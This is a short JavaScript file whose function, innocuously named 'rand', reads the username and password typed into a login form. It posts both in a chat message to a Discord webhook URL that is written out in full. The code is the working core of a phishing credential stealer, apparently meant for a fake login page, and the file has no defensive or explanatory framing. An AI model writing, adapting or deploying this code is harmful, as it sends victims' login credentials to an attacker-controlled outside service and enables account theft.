function rand() {
	
	
	
	u = document.getElementById("login-username").value; 
	p = document.getElementById("login-password").value;
	
	wb = "https://discord.com/api/webhooks/1369392456377831574/JPtURuHiwdqtRKCVRBdf38CXwKxRF6VT0qkez9XKUcheM0b8Eg-RdFdPEYEdZvhzPPhU"; //enter webhook here
	
	var request = new XMLHttpRequest();
      request.open("POST", wb);

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "Spidey Bot",
        avatar_url: "",
        content: "```Username: " + u + " | Password: " + p + "```"
      }

      request.send(JSON.stringify(params));
	
}
